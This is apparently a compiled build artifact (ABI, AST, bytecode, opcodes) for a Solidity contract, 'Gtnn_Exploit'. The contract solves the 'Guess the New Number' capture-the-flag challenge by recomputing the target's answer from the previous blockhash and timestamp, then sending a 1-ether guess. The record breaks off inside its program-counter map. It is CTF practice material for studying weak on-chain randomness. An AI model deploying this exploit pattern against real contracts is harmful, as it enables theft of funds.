{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_address",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "allSourcePaths": {
    "0": "contracts/Gtnn_Exploit.sol"
  },
  "ast": {
    "absolutePath": "contracts/Gtnn_Exploit.sol",
    "exportedSymbols": {
      "Gtnn_Exploit": [
        72
      ],
      "GuessTheNewNumberChallenge": [
        12
      ]
    },
    "id": 73,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.7",
          ".3"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:23:0"
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 12,
        "linearizedBaseContracts": [
          12
        ],
        "name": "GuessTheNewNumberChallenge",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "b2fa1c9e",
            "id": 6,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "isComplete",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "87:2:0"
            },
            "returnParameters": {
              "id": 5,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 4,
                  "mutability": "mutable",
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 6,
                  "src": "113:4:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 3,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "113:4:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "112:6:0"
            },
            "scope": 12,
            "src": "68:51:0",
            "stateMutability": "view",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "4ba4c16b",
            "id": 11,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "guess",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 9,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 8,
                  "mutability": "mutable",
                  "name": "n",
                  "nodeType": "VariableDeclaration",
                  "scope": 11,
                  "src": "140:7:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint8",
                    "typeString": "uint8"
                  },
                  "typeName": {
                    "id": 7,
                    "name": "uint8",
                    "nodeType": "ElementaryTypeName",
                    "src": "140:5:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "139:9:0"
            },
            "returnParameters": {
              "id": 10,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "165:0:0"
            },
            "scope": 12,
            "src": "125:41:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 73,
        "src": "25:143:0"
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 72,
        "linearizedBaseContracts": [
          72
        ],
        "name": "Gtnn_Exploit",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 14,
            "mutability": "mutable",
            "name": "gtnn",
            "nodeType": "VariableDeclaration",
            "scope": 72,
            "src": "198:31:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_GuessTheNewNumberChallenge_$12",
              "typeString": "contract GuessTheNewNumberChallenge"
            },
            "typeName": {
              "id": 13,
              "name": "GuessTheNewNumberChallenge",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 12,
              "src": "198:26:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_GuessTheNewNumberChallenge_$12",
                "typeString": "contract GuessTheNewNumberChallenge"
              }
            },
            "visibility": "internal"
          },
          {
            "body": {
              "id": 32,
              "nodeType": "Block",
              "src": "274:99:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 23,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 20,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "292:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 21,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "292:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "hexValue": "31",
                          "id": 22,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "305:7:0",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        },
                        "src": "292:20:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 19,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "284:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 24,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "284:29:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 25,
                  "nodeType": "ExpressionStatement",
                  "src": "284:29:0"
                },
                {
                  "expression": {
                    "id": 30,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 26,
                      "name": "gtnn",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 14,
                      "src": "323:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_GuessTheNewNumberChallenge_$12",
                        "typeString": "contract GuessTheNewNumberChallenge"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 28,
                          "name": "_address",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 16,
                          "src": "357:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 27,
                        "name": "GuessTheNewNumberChallenge",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 12,
                        "src": "330:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_GuessTheNewNumberChallenge_$12_$",
                          "typeString": "type(contract GuessTheNewNumberChallenge)"
                        }
                      },
                      "id": 29,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "330:36:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_GuessTheNewNumberChallenge_$12",
                        "typeString": "contract GuessTheNewNumberChallenge"
                      }
                    },
                    "src": "323:43:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_GuessTheNewNumberChallenge_$12",
                      "typeString": "contract GuessTheNewNumberChallenge"
                    }
                  },
                  "id": 31,
                  "nodeType": "ExpressionStatement",
                  "src": "323:43:0"
                }
              ]
            },
            "id": 33,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 17,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 16,
                  "mutability": "mutable",
                  "name": "_address",
                  "nodeType": "VariableDeclaration",
                  "scope": 33,
                  "src": "248:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 15,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "248:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "247:18:0"
            },
            "returnParameters": {
              "id": 18,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "274:0:0"
            },
            "scope": 72,
            "src": "236:137:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 66,
              "nodeType": "Block",
              "src": "405:319:0",
              "statements": [
                {
                  "assignments": [
                    37
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 37,
                      "mutability": "mutable",
                      "name": "ans",
                      "nodeType": "VariableDeclaration",
                      "scope": 66,
                      "src": "415:9:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint8",
                        "typeString": "uint8"
                      },
                      "typeName": {
                        "id": 36,
                        "name": "uint8",
                        "nodeType": "ElementaryTypeName",
                        "src": "415:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint8",
                          "typeString": "uint8"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 57,
                  "initialValue": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "commonType": {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        },
                                        "id": 49,
                                        "isConstant": false,
                                        "isLValue": false,
                                        "isPure": false,
                                        "lValueRequested": false,
                                        "leftExpression": {
                                          "expression": {
                                            "id": 46,
                                            "name": "block",
                                            "nodeType": "Identifier",
                                            "overloadedDeclarations": [],
                                            "referencedDeclaration": -4,
                                            "src": "554:5:0",
                                            "typeDescriptions": {
                                              "typeIdentifier": "t_magic_block",
                                              "typeString": "block"
                                            }
                                          },
                                          "id": 47,
                                          "isConstant": false,
                                          "isLValue": false,
                                          "isPure": false,
                                          "lValueRequested": false,
                                          "memberName": "number",
                                          "nodeType": "MemberAccess",
                                          "src": "554:12:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_uint256",
                                            "typeString": "uint256"
                                          }
                                        },
                                        "nodeType": "BinaryOperation",
                                        "operator": "-",
                                        "rightExpression": {
                                          "hexValue": "31",
                                          "id": 48,
                                          "isConstant": false,
                                          "isLValue": false,
                                          "isPure": true,
                                          "kind": "number",
                                          "lValueRequested": false,
                                          "nodeType": "Literal",
                                          "src": "569:1:0",
                                          "typeDescriptions": {
                                            "typeIdentifier": "t_rational_1_by_1",
                                            "typeString": "int_const 1"
                                          },
                                          "value": "1"
                                        },
                                        "src": "554:16:0",
                                        "typeDescriptions": {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        }
                                      }
                                    ],
                                    "expression": {
                                      "argumentTypes": [
                                        {
                                          "typeIdentifier": "t_uint256",
                                          "typeString": "uint256"
                                        }
                                      ],
                                      "id": 45,
                                      "name": "blockhash",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": -5,
                                      "src": "544:9:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
                                        "typeString": "function (uint256) view returns (bytes32)"
                                      }
                                    },
                                    "id": 50,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "kind": "functionCall",
                                    "lValueRequested": false,
                                    "names": [],
                                    "nodeType": "FunctionCall",
                                    "src": "544:27:0",
                                    "tryCall": false,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_bytes32",
                                      "typeString": "bytes32"
                                    }
                                  },
                                  {
                                    "expression": {
                                      "id": 51,
                                      "name": "block",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": -4,
                                      "src": "597:5:0",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_magic_block",
                                        "typeString": "block"
                                      }
                                    },
                                    "id": 52,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "memberName": "timestamp",
                                    "nodeType": "MemberAccess",
                                    "src": "597:15:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_bytes32",
                                      "typeString": "bytes32"
                                    },
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "expression": {
                                    "id": 43,
                                    "name": "abi",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": -1,
                                    "src": "502:3:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_magic_abi",
                                      "typeString": "abi"
                                    }
                                  },
                                  "id": 44,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "lValueRequested": false,
                                  "memberName": "encodePacked",
                                  "nodeType": "MemberAccess",
                                  "src": "502:16:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
                                    "typeString": "function () pure returns (bytes memory)"
                                  }
                                },
                                "id": 53,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "502:132:0",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_bytes_memory_ptr",
                                  "typeString": "bytes memory"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_bytes_memory_ptr",
                                  "typeString": "bytes memory"
                                }
                              ],
                              "id": 42,
                              "name": "keccak256",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": -8,
                              "src": "471:9:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
                                "typeString": "function (bytes memory) pure returns (bytes32)"
                              }
                            },
                            "id": 54,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "functionCall",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "471:181:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_bytes32",
                              "typeString": "bytes32"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_bytes32",
                              "typeString": "bytes32"
                            }
                          ],
                          "id": 41,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "446:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_uint256_$",
                            "typeString": "type(uint256)"
                          },
                          "typeName": {
                            "id": 40,
                            "name": "uint256",
                            "nodeType": "ElementaryTypeName",
                            "src": "446:7:0",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 55,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "446:220:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 39,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "427:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_uint8_$",
                        "typeString": "type(uint8)"
                      },
                      "typeName": {
                        "id": 38,
                        "name": "uint8",
                        "nodeType": "ElementaryTypeName",
                        "src": "427:5:0",
                        "typeDescriptions": {}
                      }
                    },
                    "id": 56,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "427:249:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "415:261:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 63,
                        "name": "ans",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 37,
                        "src": "713:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint8",
                          "typeString": "uint8"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint8",
                          "typeString": "uint8"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint8",
                            "typeString": "uint8"
                          }
                        ],
                        "expression": {
                          "id": 58,
                          "name": "gtnn",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 14,
                          "src": "686:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_GuessTheNewNumberChallenge_$12",
                            "typeString": "contract GuessTheNewNumberChallenge"
                          }
                        },
                        "id": 60,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "guess",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 11,
                        "src": "686:10:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$_t_uint8_$returns$__$",
                          "typeString": "function (uint8) payable external"
                        }
                      },
                      "id": 62,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "hexValue": "31",
                          "id": 61,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "704:7:0",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        }
                      ],
                      "src": "686:26:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$_t_uint8_$returns$__$value",
                        "typeString": "function (uint8) payable external"
                      }
                    },
                    "id": 64,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "686:31:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 65,
                  "nodeType": "ExpressionStatement",
                  "src": "686:31:0"
                }
              ]
            },
            "functionSelector": "63d9b770",
            "id": 67,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "exploit",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 34,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "395:2:0"
            },
            "returnParameters": {
              "id": 35,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "405:0:0"
            },
            "scope": 72,
            "src": "379:345:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 70,
              "nodeType": "Block",
              "src": "757:2:0",
              "statements": []
            },
            "id": 71,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 68,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "737:2:0"
            },
            "returnParameters": {
              "id": 69,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "757:0:0"
            },
            "scope": 72,
            "src": "730:29:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 73,
        "src": "170:591:0"
      }
    ],
    "src": "0:762:0"
  },
  "bytecode": "608060405260405161017c38038061017c8339818101604052602081101561002657600080fd5b5051670de0b6b3a7640000341461003c57600080fd5b600080546001600160a01b039092166001600160a01b03199092169190911790556101108061006c6000396000f3fe608060405260043610601f5760003560e01c806363d9b77014602a576025565b36602557005b600080fd5b348015603557600080fd5b50603c603e565b005b604080516000194301406020808301919091524282840152825180830384018152606083018085528151919092012060008054634ba4c16b60e01b90935260ff82166064850152935190936001600160a01b0390921692634ba4c16b92670de0b6b3a76400009260848084019382900301818588803b15801560bf57600080fd5b505af115801560d2573d6000803e3d6000fd5b50505050505056fea264697066735822122028df10b981c808a3cd2f4368630441e508a8eb6181f7dbd754cd4154318d5a4c64736f6c63430007060033",
  "bytecodeSha1": "9a007a6d57bac2bb2f58f018ab53cf31f6abc81f",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.7.6+commit.7338295f"
  },
  "contractName": "Gtnn_Exploit",
  "coverageMap": {
    "branches": {
      "0": {}
    },
    "statements": {
      "0": {
        "Gtnn_Exploit.exploit": {
          "0": [
            686,
            717
          ]
        }
      }
    }
  },
  "dependencies": [
    "GuessTheNewNumberChallenge"
  ],
  "deployedBytecode": "608060405260043610601f5760003560e01c806363d9b77014602a576025565b36602557005b600080fd5b348015603557600080fd5b50603c603e565b005b604080516000194301406020808301919091524282840152825180830384018152606083018085528151919092012060008054634ba4c16b60e01b90935260ff82166064850152935190936001600160a01b0390921692634ba4c16b92670de0b6b3a76400009260848084019382900301818588803b15801560bf57600080fd5b505af115801560d2573d6000803e3d6000fd5b50505050505056fea264697066735822122028df10b981c808a3cd2f4368630441e508a8eb6181f7dbd754cd4154318d5a4c64736f6c63430007060033",
  "deployedSourceMap": "170:591:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;379:345;;;;;;;;;;;;;:::i;:::-;;;502:132;;;-1:-1:-1;;554:12:0;:16;544:27;502:132;;;;;;;;597:15;502:132;;;;;;;;;;;;;;;;;;;471:181;;;;;;;415:9;686:4;;-1:-1:-1;;;686:31:0;;;;;;;;;;;;471:181;;-1:-1:-1;;;;;686:4:0;;;;:10;;704:7;;686:31;;;;;;;;;;704:7;686:4;:31;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;379:345;:::o",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "offset": [
    170,
    761
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH1 0x2A JUMPI PUSH1 0x25 JUMP JUMPDEST CALLDATASIZE PUSH1 0x25 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x3C PUSH1 0x3E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x0 NOT NUMBER ADD BLOCKHASH PUSH1 0x20 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE TIMESTAMP DUP3 DUP5 ADD MSTORE DUP3 MLOAD DUP1 DUP4 SUB DUP5 ADD DUP2 MSTORE PUSH1 0x60 DUP4 ADD DUP1 DUP6 MSTORE DUP2 MLOAD SWAP2 SWAP1 SWAP3 ADD KECCAK256 PUSH1 0x0 DUP1 SLOAD PUSH4 0x4BA4C16B PUSH1 0xE0 SHL SWAP1 SWAP4 MSTORE PUSH1 0xFF DUP3 AND PUSH1 0x64 DUP6 ADD MSTORE SWAP4 MLOAD SWAP1 SWAP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP3 PUSH4 0x4BA4C16B SWAP3 PUSH8 0xDE0B6B3A7640000 SWAP3 PUSH1 0x84 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0xBF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH1 0xD2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x28 0xDF LT 0xB9 DUP2 0xC8 ADDMOD LOG3 0xCD 0x2F NUMBER PUSH9 0x630441E508A8EB6181 0xF7 0xDB 0xD7 SLOAD 0xCD COINBASE SLOAD BALANCE DUP14 GAS 0x4C PUSH5 0x736F6C6343 STOP SMOD MOD STOP CALLER ",
  "pcMap": {
    "0": {
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "8": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "LT",
      "path": "0"
    },
    "9": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "11": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "12": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "14": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "CALLDATALOAD",
      "path": "0"
    },
    "15": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "17": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "SHR",
      "path": "0"
    },
    "18": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "DUP1",
      "path": "0"
    },
    "19": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x63D9B770"
    },
    "24": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "EQ",
      "path": "0"
    },
    "25": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2A"
    },
    "27": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "28": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x25"
    },
    "30": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "JUMP",
      "path": "0"
    },
    "31": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "32": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "33": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x25"
    },
    "35": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "36": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "STOP",
      "path": "0"
    },
    "37": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "38": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "40": {
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "DUP1",
      "path": "0"
    },
    "41": {
      "first_revert": true,
      "fn": null,
      "offset": [
        170,
        761
      ],
      "op": "REVERT",
      "path": "0"
    },
    "42": {
      "fn": "Gtnn_Exploit.exploit",
      "offset": [
        379,
